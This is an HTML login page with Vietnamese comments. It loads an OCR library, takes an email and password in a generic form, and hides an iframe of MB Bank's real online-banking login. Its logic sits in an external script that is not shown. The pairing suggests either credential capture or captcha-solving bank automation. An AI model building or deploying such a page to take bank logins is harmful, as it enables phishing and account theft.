<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <meta name="generator" content="Google Web Designer 16.3.0.0407">

  <!-- Thư Viện -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@2.1.1/dist/tesseract.min.js"></script>

  <!-- Liên kết đến file CSS ngoài -->
  <link rel="stylesheet" href="style.css">

</head>

<body>

  <div class="login-container">
    <h2>Login</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" placeholder="Enter your email" required>
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
      </div>

      <!-- Thêm id="loginButton" vào nút này -->
      <button type="button" id="loginButton" class="btn-login">Login</button>

      <div class="forgot-password">
        <a href="https://example.com/forgot-password">Forgot your password?</a>
      </div>
    </form>
    <iframe src="https://online.mbbank.com.vn/pl/login" id="mbankIframe" style="display:none;"></iframe>
  </div>

  <!-- Liên kết đến file JavaScript ngoài -->
  <script src="mbank.js" defer></script>

</body>

</html>
